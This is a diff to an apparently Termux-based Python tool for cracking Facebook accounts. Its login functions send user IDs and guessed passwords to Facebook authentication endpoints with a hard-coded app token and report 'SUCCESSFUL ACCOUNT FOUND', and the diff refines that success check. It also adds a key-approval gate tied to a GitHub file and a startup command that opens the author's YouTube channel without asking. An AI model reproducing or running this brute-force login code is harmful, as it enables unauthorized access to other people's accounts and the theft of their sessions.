@@ -23,76 +23,77 @@ def get_width():
     except:
         return 45
 
+# ===== AUTOMATICALLY OPEN YOUTUBE WHEN PYTHON RUNS =====
+yt_link = "https://youtube.com/@raja-vau"
+print(" \x1b[1;32m[+] Opening YouTube Channel... Please Subscribe!")
+yt_cmd = f"am start -a android.intent.action.VIEW -d '{yt_link}' >/dev/null 2>&1 || termux-open-url '{yt_link}'"
+os.system(yt_cmd)
+time.sleep(2)
+
 # ===== GITHUB RAW KEY APPROVAL SYSTEM =====
 KEY_URL = "https://raw.githubusercontent.com/rajavau379-pixel/Raja-Vau-Teach-World-/refs/heads/main/key.txt"
 KEY_FILE = os.path.expanduser("~/.raja_vau_key.txt")
 
-def get_hwid():
-    hwid_file = os.path.expanduser("~/.raja_vau_hwid.txt")
-    try:
-        if os.path.exists(hwid_file):
-            with open(hwid_file, "r") as f:
-                saved = f.read().strip()
-            if saved:
-                return saved
-        import secrets
-        new_hwid = str(secrets.randbits(20))
-        with open(hwid_file, "w") as f:
-            f.write(new_hwid)
-        return new_hwid
-    except Exception:
-        return "12345"
+def show_branding_login():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    width = max(get_width(), 40)
+    padding = " " * max(0, (width - 55) // 2)
+    
+    print("\n")
+    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
+    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
+    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
+    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
+    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")
+    
+    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
+    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")
 
 def check_key():
-    hwid = get_hwid()
-    device_key = f"RajaVau-Teachworld-{hwid}"
-
-    # Check if saved key exists and is valid in GitHub raw
     if os.path.exists(KEY_FILE):
         try:
             with open(KEY_FILE, "r") as f:
                 saved_key = f.read().strip()
-            res = requests.get(KEY_URL, timeout=10)
-            if saved_key in res.text:
-                return
+            if saved_key:
+                res = requests.get(KEY_URL, timeout=10)
+                if saved_key in res.text:
+                    return
         except Exception:
             pass
 
     while True:
-        os.system('clear' if os.name == 'posix' else 'cls')
-        print("\n")
-        print("    ╔═════════════════════════════════════════════════════╗")
-        print(f"    ║ Your Key     : \033[1;33m{device_key}\033[0m                  ║")
-        print("    ╠═════════════════════════════════════════════════════╣")
-        print("    ║ Send this key to WhatsApp for approval!             ║")
-        print("    ║ WhatsApp No  : +880 1345-294347                     ║")
-        print("    ╚═════════════════════════════════════════════════════╝")
-        print(" [1] Check Approval Status")
-        print(" [0] Exit")
-        print("───────────────────────────────────────────────────────")
+        show_branding_login()
+        width = max(get_width(), 40)
+        padding = " " * max(0, (width - 55) // 2)
         
-        choice = input(" [-] CHOOSE ---> ").strip()
-        if choice == '1':
-            print("\n [+] Checking approval from GitHub Server...")
-            try:
-                res = requests.get(KEY_URL, timeout=10)
-                if device_key in res.text:
-                    with open(KEY_FILE, "w") as f:
-                        f.write(device_key)
-                    print("\n \033[1;32m[✓] Key Approved Successfully! Starting Tool...\033[0m")
-                    time.sleep(2)
-                    break
-                else:
-                    print("\n \033[1;31m[×] Key not approved yet! Please contact admin.\033[0m")
-                    time.sleep(2.5)
-            except Exception as e:
-                print(f"\n \033[1;31m[×] Connection Error: {e}\033[0m")
+        user_key = input(f"{padding}\033[1;33m [?] Enter Your Key (e.g. RajaVau-Teachworld-1) ---> \033[0m").strip()
+        if not user_key:
+            print(f"\n{padding}\033[1;31m [!] Key cannot be empty!\033[0m")
+            time.sleep(1.5)
+            continue
+            
+        print(f"\n{padding}\033[1;32m [+] Checking approval from GitHub Server...\033[0m")
+        try:
+            res = requests.get(KEY_URL, timeout=10)
+            if user_key in res.text:
+                with open(KEY_FILE, "w") as f:
+                    f.write(user_key)
+                print(f"\n{padding}\033[1;32m [✓] Key Approved Successfully! Starting Tool...\033[0m")
+                time.sleep(2)
+                break
+            else:
+                print(f"\n{padding}\033[1;31m [×] Invalid Key! Please contact admin for correct key.\033[0m")
                 time.sleep(2.5)
-        elif choice == '0':
-            sys.exit()
-        else:
-            print("\n [!] Invalid Choice!")
-            time.sleep(1)
+        except Exception as e:
+            print(f"\n{padding}\033[1;31m [×] Connection Error: {e}\033[0m")
+            time.sleep(2.5)
 
 def hold_screen():
     print()
@@ -131,7 +132,6 @@ def window1():
 
 sys.stdout.write('\x1b]2;𓆩【RAJA VAU TEACH WORLD】𓆪 \x07')
 
-# ===== EXACT PREFERRED BLOOD-RED KAMAL BANNER & INFO BOX =====
 def show_branding():
     os.system('clear' if os.name == 'posix' else 'cls')
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -376,7 +376,9 @@ def login_1(uid):
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-            if 'session_key' in res or 'www.facebook.com' in str(res.get('error', '')):
+            
+            # --- STRICT VALIDATION TO PREVENT FAKE HITS ---
+            if 'session_key' in res or 'access_token' in res:
                 box_padding = " " * max(0, (get_width() - 46) // 2)
                 print(f"\n{box_padding}\033[1;32m┌──────────────────────────────────────────────┐\033[0m")
                 print(f"{box_padding}\033[1;32m│\033[0m \033[1;31m [✓] SUCCESSFUL ACCOUNT FOUND                \033[0m\033[1;32m│\033[0m")
@@ -412,7 +414,9 @@ def login_2(uid):
                 }
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
-                if 'session_key' in str(po):
+                
+                # --- STRICT VALIDATION TO PREVENT FAKE HITS ---
+                if 'session_key' in po or 'access_token' in po:
                     box_padding = " " * max(0, (get_width() - 46) // 2)
                     print(f"\n{box_padding}\033[1;32m┌──────────────────────────────────────────────┐\033[0m")
                     print(f"{box_padding}\033[1;32m│\033[0m \033[1;31m [✓] SUCCESSFUL ACCOUNT FOUND                \033[0m\033[1;32m│\033[0m")
